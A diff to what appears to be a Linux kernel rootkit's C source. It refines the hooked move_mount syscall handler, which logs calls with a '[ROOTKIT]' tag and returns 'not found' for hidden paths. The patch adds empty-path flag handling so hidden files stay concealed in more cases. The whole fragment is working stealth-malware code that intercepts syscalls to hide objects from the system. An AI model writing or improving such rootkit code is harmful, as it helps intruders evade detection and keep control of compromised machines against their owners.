@@ -50,6 +50,8 @@ SYSCALL_HOOK_HANDLER5(move_mount, orig_move_mount, p_regs, int, i32_from_dfd, ch
                       s_from_pathname, int, i32_to_dfd, char __user *, s_to_pathname, unsigned int,
                       ui32_flags)
 {
+    unsigned int ui32_lflags = 0;
+
     pr_info("[ROOTKIT] move_mount(%d, %p, %d, %p, %#x)\n", i32_from_dfd, s_from_pathname,
             i32_to_dfd, s_to_pathname, ui32_flags);
 
@@ -57,13 +59,26 @@ SYSCALL_HOOK_HANDLER5(move_mount, orig_move_mount, p_regs, int, i32_from_dfd, ch
         return -EINVAL;
     }
 
-    if (is_pathname_hidden(i32_from_dfd, s_from_pathname,
-                           ui32_flags & MOVE_MOUNT_F_SYMLINKS ? LOOKUP_FOLLOW : 0)) {
+    if (ui32_flags & MOVE_MOUNT_F_SYMLINKS) {
+        ui32_lflags |= LOOKUP_FOLLOW;
+    }
+    if (ui32_flags & MOVE_MOUNT_F_EMPTY_PATH) {
+        ui32_lflags |= LOOKUP_EMPTY;
+    }
+
+    if (is_pathname_hidden(i32_from_dfd, s_from_pathname, ui32_lflags)) {
         return -ENOENT;
     }
 
-    return do_check_hidden(orig_move_mount, p_regs, i32_to_dfd, s_to_pathname,
-                           ui32_flags & MOVE_MOUNT_T_SYMLINKS ? 0 : AT_SYMLINK_NOFOLLOW);
+    ui32_lflags = 0;
+    if (!(ui32_flags & MOVE_MOUNT_T_SYMLINKS)) {
+        ui32_lflags |= AT_SYMLINK_NOFOLLOW;
+    }
+    if (ui32_flags & MOVE_MOUNT_T_EMPTY_PATH) {
+        ui32_lflags |= AT_EMPTY_PATH;
+    }
+
+    return do_check_hidden(orig_move_mount, p_regs, i32_to_dfd, s_to_pathname, ui32_lflags);
 }
 
 // sys_pivot_root syscall hook handler
